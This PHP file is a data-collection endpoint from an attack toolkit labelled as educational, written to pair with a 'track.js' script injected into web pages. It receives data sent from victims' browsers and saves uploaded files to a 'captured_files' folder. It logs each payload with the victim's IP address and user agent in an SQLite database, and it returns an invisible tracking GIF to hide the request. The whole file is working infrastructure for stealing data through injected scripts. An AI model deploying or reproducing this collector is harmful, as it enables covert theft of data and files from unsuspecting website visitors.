<?php
/**
 * Store tracking log
 * @author Krzysztof Kotowicz <kkotowicz at gmail dot com>
 * @see http://blog.kotowicz.net
 *
 * THIS FILE IS PART OF THE PROJECT FOR EDUCATIONAL USE *ONLY*
 * ANY COMMERCIAL USE, E.G. FOR VULNERABILITY ASSESSMENT,
 * PENETRATION TESTING IS PROHIBITED - CONTACT THE AUTHOR FOR PERMISSION
 *
 * PERFORMING ACTUAL ATTACKS ON WEBSITES NOT OWNED BY YOU
 * USING THIS PROJECT IS PROHIBITED!
 *
 * Use together with track.js script!
 */

$file_storage = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'captured_files';

if (count($_GET) == 1) { // encoded
    parse_str(urldecode($_SERVER['QUERY_STRING']), $_GET);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') { // file upload
    $_GET = $_POST;
}

if (!empty($_FILES['contents'])) {
    $uniq = uniqid("file-");
    move_uploaded_file($_FILES['contents']['tmp_name'], $file_storage . DIRECTORY_SEPARATOR . $uniq);
    $_GET['contents'] = $uniq;
}

if (!empty($_GET)) {
    $db = new PDO('sqlite:' . dirname(__FILE__) . DIRECTORY_SEPARATOR . 'payloads.sqlite');

    $site = !empty($_GET['site']) ? $_GET['site'] : 'default';
    unset($_GET['site']);
    unset($_GET['_']);
    $_GET['agent'] = $_SERVER['HTTP_USER_AGENT'];
    // SQL injection protection - prepared statements
    $stmt = $db->prepare("INSERT INTO payloads (date, site, ip, payload, hidden) VALUES(:d,:s,:i,:p,0)");
    $ok = $stmt->execute(array(
        'd' => date('Y-m-d H:i:s'),
        's' => $site,
        'p' => json_encode($_GET),
        'i' => $_SERVER['REMOTE_ADDR'])
    );
}

header("Content-Type: image/gif");
//43byte 1x1 transparent pixel gif
echo base64_decode("R0lGODlhAQABAIAAAAAAAAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==");
